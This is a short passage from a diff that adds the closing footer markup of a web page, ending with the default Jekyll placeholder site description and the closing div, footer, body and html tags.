+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
